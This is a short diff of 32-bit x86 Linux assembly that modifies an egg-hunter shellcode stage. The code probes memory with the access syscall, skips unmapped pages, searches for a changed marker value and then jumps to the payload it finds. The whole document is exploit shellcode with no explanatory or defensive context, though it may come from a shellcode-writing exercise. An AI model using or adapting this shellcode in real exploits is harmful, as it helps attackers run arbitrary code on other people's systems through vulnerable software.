@@ -1,10 +1,10 @@
 global _start
 section .text
-    _start:                 ; Make sure direction flag isn't set
-        jmp short call_shellcode
+    _start:
 
      prep:
-        pop edx
+        xor edx, edx
+	xor ecx, ecx
         cld
 
      pageloop:
@@ -13,21 +13,15 @@ section .text
      mainloop:
         inc edx
         lea ebx, [edx+0x4]
-        push byte 0x21
+        push 0x21
         pop eax
         int 0x80
         cmp al, 0xf2
-        jz pageloop
-        mov eax, 0x90509050
+        je pageloop
+        mov eax, 0x1b2a1b2a
         mov edi, edx
         scasd
-        jnz mainloop
+        jne mainloop
         scasd
-        jnz mainloop
+        jne mainloop
         jmp edi
-
-    call_shellcode:
-        call prep
-
-
-
